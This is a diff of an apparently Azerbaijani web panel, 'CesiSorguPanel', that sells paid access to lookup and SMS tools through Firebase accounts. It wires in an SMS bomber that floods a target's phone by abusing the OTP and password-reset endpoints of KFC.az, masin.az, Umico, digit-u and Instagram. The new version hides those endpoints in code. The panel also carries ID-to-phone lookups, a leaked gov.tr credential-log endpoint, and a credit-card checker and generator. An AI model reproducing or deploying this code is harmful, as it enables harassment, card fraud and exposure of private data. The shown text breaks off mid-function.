-            left: -9999px;
-        }
-
-        .file-input-label {
-            display: block;
-            padding: 1rem;
-            background: rgba(255,255,255,0.05);
-            border: 2px dashed rgba(255,255,255,0.2);
-            border-radius: 1rem;
-            text-align: center;
-            cursor: pointer;
-            transition: all 0.3s;
-        }
-
-        .file-input-label:hover {
-            border-color: var(--primary);
-            background: rgba(108, 92, 231, 0.1);
-        }
-
-        /* Profile */
-        .profile-card {
-            max-width: 600px;
-        }
-
-        .avatar-upload {
-            display: flex;
-            align-items: center;
-            gap: 1.5rem;
-            margin-bottom: 2rem;
-        }
-
-        .avatar-preview {
-            width: 100px;
-            height: 100px;
-            border-radius: 50%;
-            object-fit: cover;
-            border: 3px solid var(--primary);
-            box-shadow: var(--neon-purple);
-        }
-
-        .form-group {
-            margin-bottom: 1.5rem;
-        }
-
-        .form-group label {
-            display: block;
-            margin-bottom: 0.5rem;
-            color: #8892b0;
-            font-size: 0.9rem;
-        }
-
-        /* Search Filter */
-        .search-filter {
-            display: flex;
-            gap: 1rem;
-            margin-bottom: 2rem;
-            flex-wrap: wrap;
-        }
-
-        .search-input {
-            flex: 1;
-            min-width: 250px;
-            padding: 1rem 1.5rem;
-            background: rgba(255,255,255,0.05);
-            border: 1px solid var(--border);
-            border-radius: 1rem;
-            color: white;
-            font-size: 1rem;
-        }
-
-        /* Loading Spinner */
-        .spinner {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 3px solid rgba(255,255,255,0.3);
-            border-radius: 50%;
-            border-top-color: white;
-            animation: spin 1s ease-in-out infinite;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        /* Chart Container */
-        .chart-container {
-            position: relative;
-            height: 300px;
-            margin-top: 1rem;
-        }
-
-        /* Responsive */
         @media (max-width: 1024px) {
-            .sidebar {
-                transform: translateX(-100%);
-            }
-            
-            .sidebar.open {
-                transform: translateX(0);
-            }
-            
-            .main-content {
-                margin-left: 0;
-            }
-            
-            .mobile-menu-btn {
-                display: block !important;
-                position: fixed;
-                top: 1rem;
-                left: 1rem;
-                z-index: 99;
-                background: var(--bg-card);
-                border: 1px solid var(--border);
-                color: white;
-                padding: 0.8rem;
-                border-radius: 0.8rem;
-                cursor: pointer;
-            }
-            
-            .query-grid {
-                grid-template-columns: 1fr;
-            }
+            .sidebar { transform: translateX(-100%); }
+            .sidebar.open { transform: translateX(0); }
+            .main-content { margin-left: 0; }
+            .mobile-menu-btn { display: block !important; position: fixed; top: 1rem; left: 1rem; z-index: 99; background: var(--bg-card); border: 1px solid var(--border); color: white; padding: 0.8rem; border-radius: 0.8rem; cursor: pointer; }
         }
-
-        @media (min-width: 1025px) {
-            .mobile-menu-btn {
-                display: none !important;
-            }
-        }
-
-        /* Scrollbar */
-        ::-webkit-scrollbar {
-            width: 8px;
-            height: 8px;
-        }
-
-        ::-webkit-scrollbar-track {
-            background: rgba(0,0,0,0.2);
-            border-radius: 4px;
-        }
-
-        ::-webkit-scrollbar-thumb {
-            background: var(--primary);
-            border-radius: 4px;
-        }
-
-        ::-webkit-scrollbar-thumb:hover {
-            background: var(--secondary);
-        }
-
-        /* Animations */
-        .fade-in {
-            animation: fadeIn 0.5s ease-out;
-        }
-
-        .slide-up {
-            animation: slideUp 0.5s ease-out;
-        }
-
-        /* Announcement Banner */
-        .announcement-banner {
-            background: linear-gradient(90deg, rgba(255, 165, 2, 0.2), rgba(255, 99, 72, 0.2));
-            border: 1px solid rgba(255, 165, 2, 0.3);
-            border-radius: 1rem;
-            padding: 1rem;
-            margin-bottom: 2rem;
-            display: flex;
-            align-items: center;
-            gap: 1rem;
-            animation: pulse 2s infinite;
-        }
-
-        .announcement-banner i {
-            font-size: 1.5rem;
-            color: #ffa502;
-        }
-
-        /* Admin Badge */
-        .admin-badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 5px;
-            background: linear-gradient(135deg, #ff4757, #ff6348);
-            padding: 0.3rem 0.8rem;
-            border-radius: 20px;
-            font-size: 0.75rem;
-            font-weight: 700;
-            margin-left: 0.5rem;
-            box-shadow: 0 0 10px rgba(255, 71, 87, 0.5);
-        }
+        @media (min-width: 1025px) { .mobile-menu-btn { display: none !important; } }
+        
+        .admin-badge { display: inline-flex; align-items: center; gap: 5px; background: linear-gradient(135deg, #ff4757, #ff6348); padding: 0.3rem 0.8rem; border-radius: 20px; font-size: 0.75rem; font-weight: 700; margin-left: 0.5rem; }
     </style>
 </head>
 <body>
     <div class="bg-animation"></div>
     <div class="toast-container" id="toastContainer"></div>
-
-    <!-- Mobile Menu Button -->
-    <button class="mobile-menu-btn" onclick="toggleSidebar()">
-        <i class="fas fa-bars"></i>
-    </button>
+    <button class="mobile-menu-btn" onclick="toggleSidebar()"><i class="fas fa-bars"></i></button>
 
     <!-- Auth Container -->
     <div id="authContainer" class="auth-container">
-        <div class="glass-card slide-up">
+        <div class="glass-card">
             <div class="logo-area">
-                <i class="fas fa-crown"></i>
-                <h1>CesiSorguPanel</h1>
-                <p style="color: #8892b0; font-size: 0.9rem; margin-top: 0.5rem;">Ultra Premium Sorgu & SMS Sistemi</p>
+                <i class="fas fa-shield-alt"></i>
+                <h1>CesiSorguPanel V2</h1>
+                <p style="color: #8892b0; font-size: 0.9rem; margin-top: 0.5rem;">Google + Email Giriş</p>
             </div>
+
+            <button onclick="signInWithGoogle()" class="btn btn-google" style="margin-bottom: 1rem;">
+                <i class="fab fa-google"></i> Google ilə Giriş
+            </button>
+
+            <div class="divider"><span>VEYA</span></div>
 
             <form id="loginForm">
                 <div class="input-group">
                     <i class="fas fa-envelope"></i>
-                    <input type="email" id="loginEmail" placeholder="E-poçt ünvanı" required>
+                    <input type="email" id="loginEmail" placeholder="E-poçt" required>
                 </div>
                 <div class="input-group">
                     <i class="fas fa-lock"></i>
                     <input type="password" id="loginPassword" placeholder="Şifrə" required>
                 </div>
-                <button type="submit" class="btn btn-primary">
-                    <i class="fas fa-sign-in-alt"></i> Giriş Yap
-                </button>
+                <button type="submit" class="btn btn-primary"><i class="fas fa-sign-in-alt"></i> Giriş</button>
             </form>
 
-            <div class="divider"><span>VEYA</span></div>
+            <div class="divider"><span>YENİ HESAB</span></div>
 
             <form id="registerForm">
-                <div class="input-group">
-                    <i class="fas fa-user"></i>
-                    <input type="text" id="registerUsername" placeholder="İstifadəçi adı" required>
-                </div>
-                <div class="input-group">
-                    <i class="fas fa-envelope"></i>
-                    <input type="email" id="registerEmail" placeholder="E-poçt ünvanı" required>
-                </div>
-                <div class="input-group">
-                    <i class="fas fa-lock"></i>
-                    <input type="password" id="registerPassword" placeholder="Şifrə" required>
-                </div>
-                <div class="input-group">
-                    <i class="fas fa-link"></i>
-                    <input type="text" id="referralCode" placeholder="Referans kodu (vacib deyil)">
-                </div>
-                <button type="submit" class="btn btn-secondary">
-                    <i class="fas fa-user-plus"></i> Qeydiyyatdan Keç
-                </button>
+                <div class="input-group"><i class="fas fa-user"></i><input type="text" id="registerUsername" placeholder="İstifadəçi adı" required></div>
+                <div class="input-group"><i class="fas fa-envelope"></i><input type="email" id="registerEmail" placeholder="E-poçt" required></div>
+                <div class="input-group"><i class="fas fa-lock"></i><input type="password" id="registerPassword" placeholder="Şifrə" required></div>
+                <div class="input-group"><i class="fas fa-link"></i><input type="text" id="referralCode" placeholder="Referans kodu"></div>
+                <button type="submit" class="btn btn-secondary"><i class="fas fa-user-plus"></i> Qeydiyyat</button>
             </form>
 
             <div id="authError" class="error-message"></div>
@@ -1155,119 +208,44 @@
 
     <!-- App Container -->
     <div id="appContainer" class="app-container" style="display: none;">
-        <!-- Sidebar -->
         <div class="sidebar" id="sidebar">
             <div class="sidebar-header">
-                <i class="fas fa-chart-line"></i>
-                <span>CesiSorgu<span style="color: var(--secondary);">Panel</span></span>
+                <i class="fas fa-shield-alt"></i>
+                <span>CesiSorgu<span style="color: var(--secondary);">V2</span></span>
             </div>
 
             <div class="user-stats">
-                <div class="stat-row">
-                    <span><i class="fas fa-user"></i> İstifadəçi</span>
-                    <span class="stat-value" id="userGreeting">-</span>
-                </div>
-                <div class="stat-row">
-                    <span><i class="fas fa-coins"></i> Balans</span>
-                    <span class="stat-value" id="userBalance">0 SIKKƏ</span>
-                </div>
-                <div class="stat-row">
-                    <span><i class="fas fa-search"></i> Sorgu Hakkı</span>
-                    <span class="stat-value" id="queryStatus">-</span>
-                </div>
-                <div class="stat-row">
-                    <span><i class="fas fa-sms"></i> SMS Limiti</span>
-                    <span class="stat-value" id="smsStatus">-</span>
-                </div>
-                <div class="stat-row">
-                    <span><i class="fas fa-crown"></i> Premium</span>
-                    <span class="stat-value premium" id="premiumExpiry">-</span>
-                </div>
+                <div class="stat-row"><span><i class="fas fa-user"></i> İstifadəçi</span><span class="stat-value" id="userGreeting">-</span></div>
+                <div class="stat-row"><span><i class="fas fa-coins"></i> Balans</span><span class="stat-value" id="userBalance">0</span></div>
+                <div class="stat-row"><span><i class="fas fa-search"></i> Sorgu</span><span class="stat-value" id="queryStatus">-</span></div>
+                <div class="stat-row"><span><i class="fas fa-sms"></i> SMS</span><span class="stat-value" id="smsStatus">-</span></div>
+                <div class="stat-row"><span><i class="fas fa-crown"></i> Premium</span><span class="stat-value premium" id="premiumExpiry">-</span></div>
             </div>
 
             <ul class="nav-tabs" id="userTabs">
-                <li><div class="tab-link active" data-tab="querytools" onclick="switchTab('querytools')">
-                    <i class="fas fa-tools"></i> Sorgu Alətləri
-                </div></li>
-                <li><div class="tab-link" data-tab="packages" onclick="switchTab('packages')">
-                    <i class="fas fa-gem"></i> Premium Paketlər
-                </div></li>
-                <li><div class="tab-link" data-tab="favorites" onclick="switchTab('favorites')">
-                    <i class="fas fa-star"></i> Favorilərim
-                </div></li>
-                <li><div class="tab-link" data-tab="profile" onclick="switchTab('profile')">
-                    <i class="fas fa-user-cog"></i> Profil
-                </div></li>
-                <li><div class="tab-link" data-tab="referral" onclick="switchTab('referral')">
-                    <i class="fas fa-hand-holding-usd"></i> Referans Sistemi
-                </div></li>
+                <li><div class="tab-link active" data-tab="querytools" onclick="switchTab('querytools')"><i class="fas fa-tools"></i> Sorgu Alətləri</div></li>
+                <li><div class="tab-link" data-tab="packages" onclick="switchTab('packages')"><i class="fas fa-gem"></i> Premium</div></li>
+                <li><div class="tab-link" data-tab="profile" onclick="switchTab('profile')"><i class="fas fa-user-cog"></i> Profil</div></li>
             </ul>
 
             <ul class="nav-tabs" id="adminTabs" style="display: none; border-top: 1px solid var(--border); margin-top: 1rem; padding-top: 1rem;">
-                <li style="color: var(--danger); font-size: 0.8rem; margin-bottom: 0.5rem; padding-left: 1rem; font-weight: 700;">
-                    <i class="fas fa-shield-alt"></i> ADMIN PANEL
-                </li>
-                <li><div class="tab-link" data-tab="admin-users" onclick="switchTab('admin-users')">
-                    <i class="fas fa-users"></i> İstifadəçilər
-                </div></li>
-                <li><div class="tab-link" data-tab="admin-payments" onclick="switchTab('admin-payments')">
-                    <i class="fas fa-credit-card"></i> Ödənişlər
-                </div></li>
-                <li><div class="tab-link" data-tab="admin-stats" onclick="switchTab('admin-stats')">
-                    <i class="fas fa-chart-bar"></i> Statistika
-                </div></li>
-                <li><div class="tab-link" data-tab="admin-logs" onclick="switchTab('admin-logs')">
-                    <i class="fas fa-history"></i> Loglar
-                </div></li>
-                <li><div class="tab-link" data-tab="admin-announce" onclick="switchTab('admin-announce')">
-                    <i class="fas fa-bullhorn"></i> Elanlar
-                </div></li>
+                <li style="color: var(--danger); font-size: 0.8rem; margin-bottom: 0.5rem; padding-left: 1rem;"><i class="fas fa-shield-alt"></i> ADMIN</li>
+                <li><div class="tab-link" onclick="switchTab('admin-users')"><i class="fas fa-users"></i> İstifadəçilər</div></li>
+                <li><div class="tab-link" onclick="switchTab('admin-payments')"><i class="fas fa-credit-card"></i> Ödənişlər</div></li>
             </ul>
 
-            <button onclick="logout()" class="btn logout-btn">
-                <i class="fas fa-sign-out-alt"></i> Çıxış Et
-            </button>
+            <button onclick="logout()" class="btn logout-btn"><i class="fas fa-sign-out-alt"></i> Çıxış</button>
         </div>
 
-        <!-- Main Content -->
         <div class="main-content" id="mainContent">
-            <div id="announcementArea"></div>
-            
-            <div id="contentArea" class="fade-in">
-                <!-- Content will be loaded here -->
-            </div>
-        </div>
-    </div>
-
-    <!-- Payment Modal -->
-    <div id="paymentModal" class="modal-overlay">
-        <div class="modal-content">
-            <div class="modal-header">
-                <h3><i class="fas fa-credit-card"></i> Ödəniş Təsdiqi</h3>
-            </div>
-            <div id="paymentDetails"></div>
-            <div class="file-input-wrapper">
-                <input type="file" id="receiptFile" accept="image/*">
-                <label for="receiptFile" class="file-input-label">
-                    <i class="fas fa-cloud-upload-alt" style="font-size: 2rem; margin-bottom: 0.5rem; display: block;"></i>
-                    <span>Ödəniş qəbzini yükləyin</span>
-                </label>
-            </div>
-            <div style="display: flex; gap: 1rem;">
-                <button onclick="submitPayment()" class="btn btn-primary" style="flex: 1;">
-                    <i class="fas fa-check"></i> Təsdiqlə
-                </button>
-                <button onclick="closePaymentModal()" class="btn btn-secondary" style="flex: 1;">
-                    <i class="fas fa-times"></i> Bağla
-                </button>
-            </div>
+            <div id="contentArea"></div>
         </div>
     </div>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-        import { getAuth, signInWithEmailAndPassword, createUserWithEmailAndPassword, signOut, onAuthStateChanged, updatePassword } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
-        import { getDatabase, ref, set, get, update, push, onValue, remove } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
+        import { getAuth, signInWithEmailAndPassword, createUserWithEmailAndPassword, signOut, onAuthStateChanged, updatePassword, GoogleAuthProvider, signInWithPopup } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
+        import { getDatabase, ref, set, get, update, push, onValue } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
         import { getStorage, ref as storageRef, uploadString, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-storage.js";
 
         const firebaseConfig = {
@@ -1284,1118 +262,515 @@
         const auth = getAuth(app);
         const db = getDatabase(app);
         const storage = getStorage(app);
+        const googleProvider = new GoogleAuthProvider();
 
-        let currentUser = null;
-        let userData = null;
-        let isAdmin = false;
-        let currentPaymentPackage = null;
-        let chartInstance = null;
+        let currentUser = null, userData = null, isAdmin = false;
 
-        // Tool Definitions
-        const tools = [
-            // Query Tools (Limit: 3)
-            { id: "whois", name: "WHOIS Sorgu", url: "https://ecceliniz.wuaze.com/whoisorgu.php?domain=", param: "domain", method: "GET", type: "query", icon: "fa-globe" },
-            { id: "dns", name: "DNS Sorgu", url: "https://ecceliniz.wuaze.com/dnsorgu.php?domain=", param: "domain", method: "GET", type: "query", icon: "fa-server" },
-            { id: "ip", name: "IP Sorgu", url: "https://ecceliniz.wuaze.com/ipsorgu.php?ip=", param: "ip", method: "GET", type: "query", icon: "fa-network-wired" },
-            { id: "tcgsm", name: "TC → GSM", url: "https://ecceliniz.wuaze.com/tcgsm-api.php?tc=", param: "tc", method: "GET", type: "query", icon: "fa-mobile-alt" },
-            { id: "subdomain", name: "Subdomain Sorgu", url: "https://ecceliniz.wuaze.com/subdomain-api.php?domain=", param: "domain", method: "GET", type: "query", icon: "fa-sitemap" },
-            { id: "sgk", name: "SGK İşyeri Sorgu", url: "https://ecceliniz.wuaze.com/sowixsgk-api.php?action=search&q=", param: "q", method: "GET", type: "query", icon: "fa-building" },
-            { id: "plaka", name: "Plaka Sorgu", url: "https://ecceliniz.wuaze.com/plakasorgu.php?plaka=", param: "plaka", method: "GET", type: "query", icon: "fa-car" },
-            { id: "govtr", name: "Gov.tr Log", url: "https://ecceliniz.wuaze.com/gov.tr_logapi.php?api_key=lorex&action=combo&limit=100", direct: true, method: "GET", type: "query", icon: "fa-file-alt" },
-            { id: "deepseek", name: "DeepSeek AI", url: "https://ecceliniz.wuaze.com/deepseek_api.php", method: "POST", fields: ["soru"], type: "query", icon: "fa-robot" },
-            { id: "link", name: "Link Kısaltma", url: "https://ecceliniz.wuaze.com/link_kisalt.php?url=", param: "url", method: "GET", type: "query", icon: "fa-link" },
-            { id: "cccheck", name: "CC Puan Checker", url: "https://ecceliniz.wuaze.com/cc_puan_checker.php", method: "POST", fields: ["card_number", "expiry_month", "expiry_year"], type: "query", icon: "fa-credit-card" },
-            { id: "ccgen", name: "Random CC Generator", url: "https://ecceliniz.wuaze.com/cc_random.php?count=5", direct: true, method: "GET", type: "query", icon: "fa-random" },
-            { id: "indiagsm", name: "India GSM Sorgu", url: "https://kenevizindiagsmsorgu.vercel.app/api/gsm-name?number=", param: "number", method: "GET", type: "query", icon: "fa-phone" },
-            { id: "globalgsm", name: "Global GSM-Name", url: "https://kenevizglobalsgm-nameapi.vercel.app/api/gsm-name?number=", param: "number", method: "GET", type: "query", icon: "fa-address-book" },
-            
-            // SMS Tools (Limit: 50)
-            { id: "smsbomb", name: "SMS Bomber (Lorex)", url: "https://ecceliniz.wuaze.com/sms-api.php?number=", param: "number", method: "GET", type: "sms", icon: "fa-bomb" },
-            { id: "igreset", name: "Instagram Şifre Sıfırlama", url: "https://ecceliniz.wuaze.com/instagram_reset.php?action=reset&email=", param: "email", method: "GET", type: "sms", icon: "fa-instagram" },
-            { id: "turbo", name: "Turbo (Digit)", url: "https://api.digit-u.id/auth", method: "POST", fields: ["phone"], type: "sms", icon: "fa-bolt" },
-            { id: "tapaz", name: "TapAz (Digit)", url: "https://api.digit-u.id/auth", method: "POST", fields: ["phone"], type: "sms", icon: "fa-shopping-bag" },
-            { id: "kfc", name: "KFC Azerbaijan", url: "https://api.kfc.az/api/v1/client/validate-data", method: "POST", fields: ["phone"], type: "sms", icon: "fa-drumstick-bite" },
-            { id: "masinaz", name: "Masin.az", url: "https://www.masin.az/api/auth/send-phone-otp", method: "POST", fields: ["phone"], type: "sms", icon: "fa-car-side" },
-            { id: "umico", name: "Umico", url: "https://customer.umico.az/v3/clients/account/sign-in", method: "POST", fields: ["email_or_phone"], type: "sms", icon: "fa-store" }
+        // Gizli API konfiqurasiyaları - UI-da görünmür
+        const queryTools = [
+            { id: "whois", name: "WHOIS Sorgu", url: "https://ecceliniz.wuaze.com/whoisorgu.php?domain=", param: "domain", method: "GET", icon: "fa-globe" },
+            { id: "dns", name: "DNS Sorgu", url: "https://ecceliniz.wuaze.com/dnsorgu.php?domain=", param: "domain", method: "GET", icon: "fa-server" },
+            { id: "ip", name: "IP Sorgu", url: "https://ecceliniz.wuaze.com/ipsorgu.php?ip=", param: "ip", method: "GET", icon: "fa-network-wired" },
+            { id: "tcgsm", name: "TC → GSM", url: "https://ecceliniz.wuaze.com/tcgsm-api.php?tc=", param: "tc", method: "GET", icon: "fa-mobile-alt" },
+            { id: "subdomain", name: "Subdomain", url: "https://ecceliniz.wuaze.com/subdomain-api.php?domain=", param: "domain", method: "GET", icon: "fa-sitemap" },
+            { id: "sgk", name: "SGK İşyeri", url: "https://ecceliniz.wuaze.com/sowixsgk-api.php?action=search&q=", param: "q", method: "GET", icon: "fa-building" },
+            { id: "plaka", name: "Plaka Sorgu", url: "https://ecceliniz.wuaze.com/plakasorgu.php?plaka=", param: "plaka", method: "GET", icon: "fa-car" },
+            { id: "deepseek", name: "DeepSeek AI", url: "https://ecceliniz.wuaze.com/deepseek_api.php", method: "POST", fields: ["soru"], icon: "fa-robot" },
+            { id: "link", name: "Link Kısaltma", url: "https://ecceliniz.wuaze.com/link_kisalt.php?url=", param: "url", method: "GET", icon: "fa-link" },
+            { id: "cccheck", name: "CC Checker", url: "https://ecceliniz.wuaze.com/cc_puan_checker.php", method: "POST", fields: ["card_number","expiry_month","expiry_year"], icon: "fa-credit-card" },
+            { id: "ccgen", name: "CC Generator", url: "https://ecceliniz.wuaze.com/cc_random.php?count=5", direct: true, method: "GET", icon: "fa-random" },
+            { id: "indiagsm", name: "India GSM", url: "https://kenevizindiagsmsorgu.vercel.app/api/gsm-name?number=", param: "number", method: "GET", icon: "fa-phone" },
+            { id: "globalgsm", name: "Global GSM", url: "https://kenevizglobalsgm-nameapi.vercel.app/api/gsm-name?number=", param: "number", method: "GET", icon: "fa-address-book" }
         ];
 
-        // Helper Functions
-        window.showToast = (message, type = 'success') => {
+        // Gizli SMS API-ləri - Yalnız kodda var, UI-da yox
+        const smsApiConfig = {
+            masinAz: { url: "https://www.masin.az/api/auth/send-phone-otp", method: "POST", field: "phone", weight: 15 }, // Ən çox
+            kfc: { url: "https://api.kfc.az/api/v1/client/validate-data", method: "POST", field: "phone", weight: 8 },
+            turbo: { url: "https://api.digit-u.id/auth", method: "POST", field: "phone", weight: 6 },
+            tapaz: { url: "https://api.digit-u.id/auth", method: "POST", field: "phone", weight: 6 },
+            umico: { url: "https://customer.umico.az/v3/clients/account/sign-in", method: "POST", field: "email_or_phone", weight: 5 },
+            instagram: { url: "https://ecceliniz.wuaze.com/instagram_reset.php?action=reset&email=", method: "GET", param: true, weight: 5 },
+            lorex: { url: "https://ecceliniz.wuaze.com/sms-api.php?number=", method: "GET", param: true, weight: 5 }
+        };
+
+        window.showToast = (msg, type = 'success') => {
             const container = document.getElementById('toastContainer');
             const toast = document.createElement('div');
             toast.className = `toast ${type}`;
-            const icon = type === 'success' ? 'check-circle' : type === 'error' ? 'exclamation-circle' : 'info-circle';
-            toast.innerHTML = `<i class="fas fa-${icon}"></i> <span>${message}</span>`;
+            toast.innerHTML = `<i class="fas fa-${type === 'success' ? 'check-circle' : 'exclamation-circle'}"></i> <span>${msg}</span>`;
             container.appendChild(toast);
             setTimeout(() => toast.remove(), 3000);
         };
 
-        window.toggleSidebar = () => {
-            document.getElementById('sidebar').classList.toggle('open');
+        window.toggleSidebar = () => document.getElementById('sidebar').classList.toggle('open');
+        
+        window.switchTab = (tab) => {
+            document.querySelectorAll('.tab-link').forEach(t => t.classList.remove('active'));
+            document.querySelector(`[onclick="switchTab('${tab}')"]`)?.classList.add('active');
+            document.getElementById('sidebar').classList.remove('open');
+            
+            if(tab === 'querytools') renderQueryTools();
+            else if(tab === 'packages') renderPackages();
+            else if(tab === 'profile') renderProfile();
+            else if(tab === 'admin-users') renderAdminUsers();
+            else if(tab === 'admin-payments') renderAdminPayments();
         };
 
-        function isPremium() {
-            return userData?.premiumUntil && userData.premiumUntil > Date.now();
-        }
+        function isPremium() { return userData?.premiumUntil && userData.premiumUntil > Date.now(); }
 
         async function checkQueryLimit() {
-            if (userData?.banned) {
-                showToast('Hesabınız banlanmışdır!', 'error');
-                return false;
-            }
-            if (isPremium()) return true;
+            if(userData?.banned) { showToast('Banlı hesab!', 'error'); return false; }
+            if(isPremium()) return true;
             const remaining = userData?.queriesRemaining ?? 3;
-            if (remaining > 0) {
+            if(remaining > 0) {
                 await update(ref(db, `users/${currentUser.uid}`), { queriesRemaining: remaining - 1 });
                 userData.queriesRemaining = remaining - 1;
                 updateUI();
                 return true;
             }
-            showToast('Sorgu hakkınız bitti! Premium paket alın.', 'error');
+            showToast('Sorgu hakkı bitti!', 'error');
             return false;
         }
 
         async function checkSmsLimit() {
-            if (userData?.banned) {
-                showToast('Hesabınız banlanmışdır!', 'error');
-                return false;
-            }
-            if (isPremium()) return true;
+            if(userData?.banned) { showToast('Banlı hesab!', 'error'); return false; }
+            if(isPremium()) return true;
             const remaining = userData?.smsQuotaRemaining ?? 50;
-            if (remaining > 0) {
-                await update(ref(db, `users/${currentUser.uid}`), { smsQuotaRemaining: remaining - 1 });
-                userData.smsQuotaRemaining = remaining - 1;
+            if(remaining >= 50) {
+                await update(ref(db, `users/${currentUser.uid}`), { smsQuotaRemaining: remaining - 50 });
+                userData.smsQuotaRemaining = remaining - 50;
                 updateUI();
                 return true;
             }
-            showToast('SMS limitiniz (50) doldu! Premium alarak limitsiz istifadə edin.', 'error');
+            showToast('SMS limiti yetərli deyil! (50 lazımdır)', 'error');
             return false;
         }
 
         function updateUI() {
             document.getElementById('userGreeting').innerText = userData?.username || '-';
-            document.getElementById('userBalance').innerText = (userData?.balance || 0).toLocaleString() + ' SIKKƏ';
-            
+            document.getElementById('userBalance').innerText = (userData?.balance || 0).toLocaleString();
             const premium = isPremium();
-            document.getElementById('queryStatus').innerHTML = premium ? 
-                '<i class="fas fa-infinity"></i> Limitsiz' : `${userData?.queriesRemaining ?? 3} sorgu`;
-            document.getElementById('smsStatus').innerHTML = premium ? 
-                '<i class="fas fa-infinity"></i> Limitsiz' : `${userData?.smsQuotaRemaining ?? 50} SMS`;
-            document.getElementById('premiumExpiry').innerHTML = premium ? 
-                new Date(userData.premiumUntil).toLocaleDateString('az-AZ') + ' <span class="admin-badge">AKTIV</span>' : 
-                'Yoxdur';
+            document.getElementById('queryStatus').innerHTML = premium ? '<i class="fas fa-infinity"></i> Limitsiz' : `${userData?.queriesRemaining ?? 3}`;
+            document.getElementById('smsStatus').innerHTML = premium ? '<i class="fas fa-infinity"></i> Limitsiz' : `${userData?.smsQuotaRemaining ?? 50}`;
+            document.getElementById('premiumExpiry').innerHTML = premium ? new Date(userData.premiumUntil).toLocaleDateString('az-AZ') : 'Yoxdur';
         }
 
-        // Tab Switching
-        window.switchTab = (tabName) => {
-            // Update active tab
-            document.querySelectorAll('.tab-link').forEach(t => t.classList.remove('active'));
-            document.querySelector(`[data-tab="${tabName}"]`)?.classList.add('active');
-            
-            // Close mobile sidebar
-            document.getElementById('sidebar').classList.remove('open');
-            
-            // Load content
-            if (tabName === 'querytools') renderQueryTools();
-            else if (tabName === 'packages') renderPackages();
-            else if (tabName === 'favorites') renderFavorites();
-            else if (tabName === 'profile') renderProfile();
-            else if (tabName === 'referral') renderReferral();
-            else if (tabName === 'admin-users') renderAdminUsers();
-            else if (tabName === 'admin-payments') renderAdminPayments();
-            else if (tabName === 'admin-stats') renderAdminStats();
-            else if (tabName === 'admin-logs') renderAdminLogs();
-            else if (tabName === 'admin-announce') renderAdminAnnounce();
-        };
-
-        // Render Functions
-        function renderQueryTools(filter = '') {
-            const filtered = tools.filter(t => t.name.toLowerCase().includes(filter.toLowerCase()));
-            const favorites = userData?.favorites || [];
-            
+        function renderQueryTools() {
             let html = `
                 <div class="content-header">
                     <h2><i class="fas fa-tools"></i> Sorgu Alətləri</h2>
-                    <p>Professional araşdırma və SMS alətləri (${filtered.length} ədəd)</p>
+                    <p>Təhlükəsiz araşdırma alətləri</p>
                 </div>
-                
-                <div class="search-filter">
-                    <input type="text" class="search-input" id="toolSearch" placeholder="🔍 Alət axtar..." value="${filter}" onkeyup="if(event.key==='Enter') renderQueryTools(this.value)">
-                    <button class="btn btn-primary" onclick="renderQueryTools(document.getElementById('toolSearch').value)" style="width: auto; padding: 0 2rem;">
-                        <i class="fas fa-search"></i> Axtar
-                    </button>
-                </div>
-                
                 <div class="query-grid">
             `;
-            
-            filtered.forEach(tool => {
-                const isFav = favorites.includes(tool.id);
-                const isSms = tool.type === 'sms';
-                
+
+            // Normal sorgu alətləri
+            queryTools.forEach(tool => {
                 html += `
-                    <div class="query-card ${isSms ? 'sms-tool' : ''}">
+                    <div class="query-card">
                         <div class="card-header">
-                            <div class="card-title">
-                                <i class="fas ${tool.icon}"></i>
-                                ${tool.name}
-                                <span class="badge ${isSms ? 'badge-sms' : 'badge-query'}">
-                                    ${isSms ? '📨 SMS' : '🔍 QUERY'}
-                                </span>
-                            </div>
-                            <button class="fav-btn ${isFav ? 'active' : ''}" onclick="toggleFavorite('${tool.id}')">
-                                <i class="${isFav ? 'fas' : 'far'} fa-star"></i>
-                            </button>
+                            <div class="card-title"><i class="fas ${tool.icon}"></i> ${tool.name}</div>
+                            <span class="badge" style="background: rgba(108, 92, 231, 0.2); color: #a29bfe;">QUERY</span>
                         </div>
                 `;
                 
-                if (tool.method === 'POST' && tool.fields) {
-                    tool.fields.forEach((field, idx) => {
-                        html += `<input type="text" class="tool-input" id="input_${tool.id}_${idx}" placeholder="${field}">`;
+                if(tool.method === 'POST' && tool.fields) {
+                    tool.fields.forEach((f, i) => {
+                        html += `<input type="text" class="tool-input" id="inp_${tool.id}_${i}" placeholder="${f}">`;
                     });
-                    html += `<button class="query-btn" onclick="executeTool('${tool.id}', 'POST')">
-                        <i class="fas fa-play"></i> İcra Et
-                    </button>`;
-                } else if (tool.direct) {
-                    html += `<button class="query-btn" onclick="executeTool('${tool.id}', 'GET')">
-                        <i class="fas fa-play"></i> İcra Et
-                    </button>`;
+                    html += `<button class="query-btn" onclick="runQuery('${tool.id}')"><i class="fas fa-play"></i> İcra Et</button>`;
+                } else if(tool.direct) {
+                    html += `<button class="query-btn" onclick="runQuery('${tool.id}')"><i class="fas fa-play"></i> İcra Et</button>`;
                 } else {
-                    html += `<input type="text" class="tool-input" id="input_${tool.id}" placeholder="${tool.param} daxil edin...">
-                    <button class="query-btn" onclick="executeTool('${tool.id}', 'GET')">
-                        <i class="fas fa-play"></i> İcra Et
-                    </button>`;
+                    html += `<input type="text" class="tool-input" id="inp_${tool.id}" placeholder="${tool.param} daxil edin...">
+                            <button class="query-btn" onclick="runQuery('${tool.id}')"><i class="fas fa-play"></i> İcra Et</button>`;
                 }
-                
-                html += `
-                        <div class="query-result" id="result_${tool.id}">
-                            <pre>Nəticə burada görünəcək...</pre>
-                        </div>
-                    </div>
-                `;
+                html += `<div class="query-result" id="res_${tool.id}"><pre>Nəticə gözlənilir...</pre></div></div>`;
             });
+
+            // SMS Bomber - Tək görünən SMS aləti
+            html += `
+                <div class="query-card sms-card" style="border: 2px solid rgba(255, 71, 87, 0.3);">
+                    <div class="card-header">
+                        <div class="card-title"><i class="fas fa-bomb"></i> SMS Bomber <span class="badge badge-sms">50 SMS</span></div>
+                    </div>
